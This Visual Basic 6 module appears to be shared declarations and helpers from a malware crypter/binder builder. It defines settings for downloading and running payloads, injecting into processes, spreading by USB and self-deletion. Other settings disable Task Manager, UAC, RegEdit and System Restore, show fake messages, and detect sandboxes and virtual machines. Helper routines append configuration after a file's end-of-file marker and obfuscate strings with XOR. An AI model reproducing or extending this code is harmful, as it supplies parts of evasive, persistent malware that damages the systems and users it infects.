Attribute VB_Name = "PublicDeclarations"
Private Declare Function StrFormatByteSizeA Lib "shlwapi" (ByVal dw As Long, ByVal pszBuf As String, ByRef cchBuf As Long) As String
Public Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

'Constants
Public Const SPIF_UPDATEINIFILE = &H1
Public Const SPIF_SENDWININICHANGE = &H2
Public Const SPI_SETCURSORS = &H57 'restores sys cursors
' Apis
Public Declare Function SystemParametersInfo Lib "user32" _
    Alias "SystemParametersInfoA" _
    (ByVal uAction As Long, ByVal uParam As Long, _
    lpvParam As Any, ByVal fuWinIni As Long) As Long

' Public Variables (Count = 17)

Public Vals(1 To 30) As String
Public T1, T2, T3, T4, T5, T6, T7, T8, T9, T10, T11, T12, T13, T14, T15, T16 As String
Public Download_Directory As String
Public Download_Name As String
Public DownLoadFile As String
Public DlExt As String
Public DlURL As String

Public CustomInj As String
Public InjDl As String
Public Exdl As String
Public DelayDL As Integer

'Startup Variables
   
Public DisableTaskMgr1

Public EncMethod As String
Public hwid1 As String

Public EncryptBound As String
Public VisitWeb As String
Public LaunchURL As String

Public WillStrUp As String
Public pFilename As String
Public Rdonly As String
Public SetHidden As String
Public BundleStart As String

Public Serials As String
Public HardDrive As String
Public DllDet As String
Public SpreadUSB As String
Public ShowTsk
Public Which_Enc As String
Public User_Data As String
Public Melt_My_File As String
Public FinalData As String
Public CdPlay As Boolean
Public Cont_Play_Song As String
Public Bnd_Out_Size As String
Public LogMsgArray(50) As String
Public BoundSize As String
' Random Encryption Key
Public Encryption_Key As String              '1
' Stealth
Public DisableSystemRestore As String
Public DisableMsconfig As String
Public DisableStart As String
Public DisableRegEdit As String
Public DisableRegEdit1 As String
Public DisableTaskMgr As String
Public DisableUAC As String
' Fake Message
Public Message_Play As String
Public Message_Title As String
Public Message_Body As String               ' 5
Public Message_Icon As Integer
Public Message_Options As String
' Antis
Public AntiSandbox As String
Public AntiVirtPC As String
Public AntiVirtBox As String
Public AntiVmWare As String
Public AntiAnubis As String                 '10
Public AntiJoeBox As String
Public AntiCws As String
Public AntiSunbelt As String
Public AntiPanda As String
Public AntiThreat As String
' Delay Runtime (Seconds)
Public DelayRunTime As Integer               '1
Public EOFFound As String
Public Inject_Into As String

Public m_cancel As Boolean

' Login
Public Function ReadIniValue(INIpath As String, Key As String, Variable As String) As String
Dim NF As Integer
Dim Temp As String
Dim LcaseTemp As String
Dim ReadyToRead As Boolean
    
AssignVariables:
        NF = FreeFile
        ReadIniValue = ""
        Key = "[" & LCase$(Key) & "]"
        Variable = LCase$(Variable)
    
EnsureFileExists:
    Open INIpath For Binary As NF
    Close NF
    SetAttr INIpath, vbArchive
    
LoadFile:
    Open INIpath For Input As NF
    While Not EOF(NF)
    Line Input #NF, Temp
    LcaseTemp = LCase$(Temp)
    If InStr(LcaseTemp, "[") <> 0 Then ReadyToRead = False
    If LcaseTemp = Key Then ReadyToRead = True
    If InStr(LcaseTemp, "[") = 0 And ReadyToRead = True Then
        If InStr(LcaseTemp, Variable & "=") = 1 Then
            ReadIniValue = Mid$(Temp, 1 + Len(Variable & "="))
            Close NF: Exit Function
            End If
        End If
    Wend
    Close NF
End Function


Public Function WriteIniValue(INIpath As String, PutKey As String, PutVariable As String, PutValue As String)
Dim Temp As String
Dim LcaseTemp As String
Dim ReadKey As String
Dim ReadVariable As String
Dim LOKEY As Integer
Dim HIKEY As Integer
Dim KeyLen As Integer
Dim VAR As Integer
Dim VARENDOFLINE As Integer
Dim NF As Integer
Dim X As Integer

AssignVariables:
    NF = FreeFile
    ReadKey = vbCrLf & "[" & LCase$(PutKey) & "]" & Chr$(13)
    KeyLen = Len(ReadKey)
    ReadVariable = Chr$(10) & LCase$(PutVariable) & "="
        
EnsureFileExists:
    Open INIpath For Binary As NF
    Close NF
    SetAttr INIpath, vbArchive
    
LoadFile:
    Open INIpath For Input As NF
    Temp = Input$(LOF(NF), NF)
    Temp = vbCrLf & Temp & "[]"
    Close NF
    LcaseTemp = LCase$(Temp)
    
LogicMenu:
    LOKEY = InStr(LcaseTemp, ReadKey)
    If LOKEY = 0 Then GoTo AddKey:
    HIKEY = InStr(LOKEY + KeyLen, LcaseTemp, "[")
    VAR = InStr(LOKEY, LcaseTemp, ReadVariable)
    If VAR > HIKEY Or VAR < LOKEY Then GoTo AddVariable:
    GoTo RenewVariable:
    
AddKey:
        Temp = Left$(Temp, Len(Temp) - 2)
        Temp = Temp & vbCrLf & vbCrLf & "[" & PutKey & "]" & vbCrLf & PutVariable & "=" & PutValue
        GoTo TrimFinalString:
        
AddVariable:
        Temp = Left$(Temp, Len(Temp) - 2)
        Temp = Left$(Temp, LOKEY + KeyLen) & PutVariable & "=" & PutValue & vbCrLf & Mid$(Temp, LOKEY + KeyLen + 1)
        GoTo TrimFinalString:
        
RenewVariable:
        Temp = Left$(Temp, Len(Temp) - 2)
        VARENDOFLINE = InStr(VAR, Temp, Chr$(13))
        Temp = Left$(Temp, VAR) & PutVariable & "=" & PutValue & Mid$(Temp, VARENDOFLINE)
        GoTo TrimFinalString:

TrimFinalString:
        Temp = Mid$(Temp, 2)
        Do Until InStr(Temp, vbCrLf & vbCrLf & vbCrLf) = 0
        Temp = Replace(Temp, vbCrLf & vbCrLf & vbCrLf, vbCrLf & vbCrLf)
        Loop
    
        Do Until Right$(Temp, 1) > Chr$(13)
        Temp = Left$(Temp, Len(Temp) - 1)
        Loop
    
        Do Until Left$(Temp, 1) > Chr$(13)
        Temp = Mid$(Temp, 2)
        Loop
    
OutputAmendedINIFile:
        Open INIpath For Output As NF
        Print #NF, Temp
        Close NF
    
End Function

Public Function ReadEOFData(sFilePath As String) As String

On Error GoTo Err:
Dim sFileBuf As String, sEOFBuf As String, sChar As String
Dim lFF As Long, lPos As Long, lPos2 As Long, lCount As Long
If Dir(sFilePath) = "" Then GoTo Err:
lFF = FreeFile
Open sFilePath For Binary As #lFF
sFileBuf = Space(LOF(lFF))
Get #lFF, , sFileBuf
Close #lFF
lPos = InStr(1, StrReverse(sFileBuf), GetNullBytes(30))
sEOFBuf = (Mid(StrReverse(sFileBuf), 1, lPos - 1))
ReadEOFData = StrReverse(sEOFBuf)
If ReadEOFData = "" Then
End If
Exit Function
Err:
ReadEOFData = vbNullString

End Function

Public Sub WriteEOFData(sFilePath As String, sEOFData As String)

    Dim sFileBuf As String
    Dim lFF As Long
    On Error Resume Next
    If Dir(sFilePath) = "" Then Exit Sub
    lFF = FreeFile
    Open sFilePath For Binary As #lFF
        sFileBuf = Space(LOF(lFF))
        Get #lFF, , sFileBuf
    Close #lFF
    Kill sFilePath
    lFF = FreeFile
    Open sFilePath For Binary As #lFF
        Put #lFF, , sFileBuf & sEOFData
    Close #lFF
    

End Sub
Public Function GetNullBytes(lNum) As String

Dim sBuf As String
Dim i As Integer
For i = 1 To lNum
sBuf = sBuf & Chr(0)
Next
GetNullBytes = sBuf

End Function

Public Function FormatKB(ByVal Amount As Long) As String
    Dim Buffer As String
    Dim Result As String
    Buffer = Space$(255)
    Result = StrFormatByteSizeA(Amount, Buffer, Len(Buffer))
    If InStr(Result, vbNullChar) > 1 Then FormatKB = Left$(Result, InStr(Result, vbNullChar) - 1)
End Function
Public Sub Delay(ByVal Time As Single)
Dim start As Single
Dim X As Long

start = Timer
Do While start + Time > Timer
X = DoEvents
If start > Timer Then
start = Timer
End If
Loop
End Sub

Public Function RndDecimal() As Single
Dim Var1 As Single, Var2 As Single
Randomize
start:
Var1 = Rnd
Var2 = Round(Var1, 1)
If Var2 >= 1.6 Or Var2 <= 0.4 Then GoTo start
RndDecimal = Var2
End Function

Public Function dbvgbwdiz(ByVal sData As String) As String
    Dim i       As Long

    For i = 1 To Len(sData)
        dbvgbwdiz = dbvgbwdiz & Chr$(Asc(Mid$(sData, i, 1)) Xor &HFE)
    Next i
End Function

Public Function Dbvgbvdiz(ByVal sData As String) As String
    Dim i       As Long

    For i = 1 To Len(sData)
        Dbvgbvdiz = Dbvgbvdiz & Chr$(Asc(Mid$(sData, i, 1)) Xor &HFD)
    Next i
End Function


